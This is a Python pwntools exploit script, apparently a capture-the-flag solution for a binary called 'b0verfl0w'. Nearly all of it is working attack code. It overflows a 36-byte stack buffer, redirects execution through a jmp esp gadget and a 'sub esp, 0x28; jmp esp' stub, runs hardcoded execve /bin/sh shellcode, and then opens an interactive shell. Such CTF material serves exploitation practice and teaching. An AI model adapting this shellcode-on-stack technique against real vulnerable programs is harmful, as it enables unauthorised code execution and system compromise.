#! /usr/bin/python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 howpwn <finn79426@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *

p = process("./b0verfl0w")
context.arch = "i386"

p.recvuntil("What's your name?\n")

# EIP offset = 36
# payload -> |shellcode|padding|

# Gadget
jmp_esp = 0x08048504
sub_esp_jmp = asm('sub esp, 0x28;jmp esp')

# Shellcode
# From http://shell-storm.org/shellcode/files/shellcode-827.php
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = shellcode.ljust(36, "A")
payload += flat([jmp_esp])
payload += sub_esp_jmp

p.sendline(payload)

p.interactive()

